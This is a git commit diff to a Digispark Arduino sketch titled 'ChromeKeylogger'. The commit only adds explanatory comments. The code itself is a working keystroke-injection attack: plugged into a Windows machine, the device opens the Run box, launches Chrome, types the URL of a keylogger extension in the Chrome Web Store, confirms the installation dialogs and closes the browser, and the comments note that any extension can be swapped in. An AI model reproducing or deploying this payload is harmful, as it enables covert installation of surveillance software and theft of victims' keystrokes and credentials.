93d17994cc996c99d5b169a1c1a518808ab0aa0b
0verd0se <43747211+0verd0se@users.noreply.github.com>
2020-02-16 17:44:47 +0530

    Added Comments where needed

--- Digispark-ChromeKeylogger.ino
+++ Digispark-ChromeKeylogger.ino
@@ -8,20 +8,20 @@ void setup() {}
 void loop() {
 
   DigiKeyboard.sendKeyStroke(0);
-  DigiKeyboard.delay(2000); 
+  DigiKeyboard.delay(2000); // Delay 
   DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); // Open the run box by pressing Windows and R button
   DigiKeyboard.delay(100);
   DigiKeyboard.println(F("chrome")); // Writes chrome.exe in the run box and executes 
   DigiKeyboard.delay(2000);
-  DigiKeyboard.print(F("https://chrome.google.com/webstore/detail/fea-keylogger/fgkghpghjcbfcflhoklkcincndlpobja"));
-  DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.delay(8000);
-  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.print(F("https://chrome.google.com/webstore/detail/fea-keylogger/fgkghpghjcbfcflhoklkcincndlpobja")); // Types in the Chrome extension url (you can even change it to any extension you want)
+  DigiKeyboard.sendKeyStroke(KEY_ENTER); // Presses enter key for browsing the URL
+  DigiKeyboard.delay(8000); // Increased delay for slow bandwidth (slow page loading hence greater delay)
+  DigiKeyboard.sendKeyStroke(KEY_ENTER); // presses enter to add the extension
   DigiKeyboard.delay(1000);
-  DigiKeyboard.sendKeyStroke(43); //tab key
-  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.sendKeyStroke(43); // Press the Tab key to confirm the installation from the dialogue box
+  DigiKeyboard.sendKeyStroke(KEY_ENTER); 
   DigiKeyboard.delay(2000);
-  DigiKeyboard.sendKeyStroke(KEY_F4, MOD_ALT_LEFT); // Closes Chrome browser
+  DigiKeyboard.sendKeyStroke(KEY_F4, MOD_ALT_LEFT); // Closes Chrome browser (ALT F4)
   DigiKeyboard.delay(100);
 
 }
